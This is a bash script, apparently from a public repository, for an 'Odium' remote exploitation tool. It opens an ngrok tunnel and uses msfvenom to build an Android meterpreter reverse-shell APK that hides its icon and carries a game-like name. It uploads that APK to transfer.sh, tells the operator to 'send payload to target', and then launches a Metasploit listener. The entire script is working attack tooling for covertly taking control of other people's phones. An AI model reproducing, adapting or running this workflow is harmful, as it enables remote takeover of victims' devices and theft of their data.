#!/bin/bash

####

# jq install

####

command -v jq > /dev/null 2>&1 || { echo >&2 "[!] JQ not found. Install it. Aborting."; 
exit 1; }

# ngrok_pid=$(pgrep ngrok)
config_file="config/metasploit_string.rc"
settings_file="config/settings.conf"
source $settings_file
# template='app/timberman.apk'
# appname="Timberman"
# local_port=4444

banner(){
   clear
   cat config/banner.txt 
}

stop_ngrok(){

   printf "[*] Stopping ngrok (kill -9 $(pgrep ngrok)) in 5s...\n"
   sleep 5
   #  kill -9 $(ps -ef | grep 'ngrok' | grep -v 'grep' | awk '{print $2}')
   kill -9 $(pgrep ngrok)
   printf "[i] Done!\n"

}

start_ngrok(){

#CHECK AND KILL NGROK IF ITS ALREADY RUNNING

if [ -z $(pgrep ngrok) ]; then
    echo "[i] Ngrok is not running!"
else
    echo "[!] Ngrok is already running, killing it!"
    stop_ngrok
fi


# START NGROK & EXCLUDE URL AND PORT TO VARIABLE
printf "[*] Starting ngrok at port: $local_port...\n"
# ngrok tcp $local_port > /dev/null &
nohup ngrok tcp $local_port &>/dev/null &
while ! nc -z localhost 4040; do
  printf "[*] Waiting for ngrok url...\n"
  sleep 1.5 
done

NGROK_REMOTE_URL="$(curl -s http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url" | sed 's/"//g' )"

if test -z "${NGROK_REMOTE_URL}"
then
  printf "[!] Ngrok returned invail url (${NGROK_REMOTE_URL})\n"
  exit 1
fi

NGROK_REMOTE_HOSTNAME="$(printf $NGROK_REMOTE_URL | awk -F "//" '{print $2}' | awk -F ":" '{print $1}')"
NGROK_REMOTE_PORT="$(printf $NGROK_REMOTE_URL | awk -F ":" '{print $3}')"

printf "[i] Ngrok remote url '$NGROK_REMOTE_URL'\n"
# printf "[*] HOSTNAME: $NGROK_REMOTE_HOSTNAME\n"
# printf "[*] PORT: $NGROK_REMOTE_PORT\n"

}

empty_input(){
    if [ -z "$input" ];
    then
        printf "[!] Input can't be empty!";
        sleep 2;
        settings;
    fi
}

default_local_port(){
   printf "\n[i] Current default local port = $local_port\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/local_port\=.*/local_port=$input/" $settings_file
    source $settings_file
    settings
}

default_app_name(){
   printf "\n[i] Current default app name = $appname\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s/appname\=.*/appname=$input/" $settings_file
    source $settings_file
    settings
}

default_app_template(){
   printf "\n[i] Current default app template = $template\n"
    read -p "[*] New value: " input
    empty_input
    sed -i "s!template\=.*!template=$input!" $settings_file
    source $settings_file
    settings
}

# default_exe_name(){
#    printf "\n[i] Current default exe name = $exename\n"
#     read -p "[*] New value: " input
#     empty_input
#     sed -i "s/exename\=.*/exename=$input/" $settings_file
#     source $settings_file
#     settings
# }

# default_exe_template(){
#    printf "\n[i] Current default exe template = $exetemplate\n"
#     read -p "[*] New value: " input
#     empty_input
#     sed -i "s!exetemplate\=.*!exetemplate=$input!" $settings_file
#     source $settings_file
#     settings
# }

settings(){
banner
printf '| Odium - Remote exploitation tool |

'
printf "Select setting to edit:\n
[1] Local port
[2] App name
[3] App template
[*] Back\n
"
read -p "[?] Choice: " sel
case $sel in
1) default_local_port;;
2) default_app_name;;
3) default_app_template;;
# 4) default_exe_name;;
# 5) default_exe_template;;
*) menu ;;
esac
}

start_android(){

   payload="android/meterpreter/reverse_tcp"

   banner
   start_ngrok
   printf "[*] Generating .apk payload...\n"
   msfvenom --platform android -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidWakelock=true LHOST=$NGROK_REMOTE_HOSTNAME LPORT=$NGROK_REMOTE_PORT > $appname.apk  
   # printf "[*] Using apktool for payload in-app injection...\n"
   printf "[*] Updating metasploit cmd file...\n"
   sed -i "s!PAYLOAD\ .*!PAYLOAD $payload!" $config_file
   sed -i "s/LPORT\ .*/LPORT $local_port/" $config_file
   printf "[*] Generating share link...\n\n"
   curl --upload-file ./$appname.apk https://transfer.sh/$appname.apk
   printf "\n\n[*] Done, send payload to target\n"
   printf "[*] Starting metasploit listener in 3s...\n" 
   sleep 3
   msfconsole -q -r $config_file
   stop_ngrok
}


# if [[ $EUID -ne 0 ]]; then
#    printf "[i] Run this script as root!!! Aborting...\n" 
#    exit 1
# fi



menu(){
banner
printf '| Odium - Remote exploitation tool |

'

printf "Select option:\n
[1] Android
[2] Settings
[*] Exit

"

read -p "[?] Choice: " platform
case $platform in
1)
   start_android;;
2) 
   settings;;
*) 
   exit;;
esac

}

menu